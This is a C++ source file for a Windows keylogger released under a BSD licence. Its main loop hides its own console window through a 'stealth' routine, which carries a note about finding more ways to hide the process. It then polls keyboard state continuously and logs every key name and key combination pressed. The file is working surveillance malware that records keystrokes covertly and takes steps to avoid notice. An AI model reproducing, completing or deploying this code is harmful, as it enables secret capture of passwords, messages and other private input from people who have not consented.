/**
 * Copyright (c) 2013, Dan
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met: 
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer. 
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "main.h"

void stealth(bool init = false) {
	if (init) {
		HWND stealth;
		AllocConsole();
		stealth = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(stealth, false);
	}
	// TODO: Find other methods to hide this process.
}

int main() {
	stealth(true);
    while (true) {
		stealth();
		bool *status = Keys::get_keyboard(), *old_status = Keys::get_old_keyboard();
		if (Keys::was_updated()) {
			int specials = 0, ordinary = 0;
			for (int i = 0; i != MAX_KEYS; ++i) {
				if (status[i]) {
					if (Keys::is_special(i)) {
						++specials;
					} else {
						++ordinary;
					}
				}
			}
			if ((specials != 0) && (ordinary != 0)) { // Combination detected.
				char *key_names = (char*) malloc(sizeof(char) * MAX_KEY_NAME);
				Keys::get_names(status, key_names, MAX_KEY_NAME);
				Logger::log(key_names);
				free(key_names);
			} else {
				for (int i = 0; i != MAX_KEYS; ++i) {
					if ((status[i]) && (!old_status[i])) {
						char *key_name = (char*) malloc(sizeof(char) * MAX_KEY_NAME);
						Keys::get_name(i, key_name, MAX_KEY_NAME);
						Logger::log(key_name);
						free(key_name);
					}
				}
			}
		}
		Keys::update_keyboard();
		SLEEP(5);
	}
	return 0;
}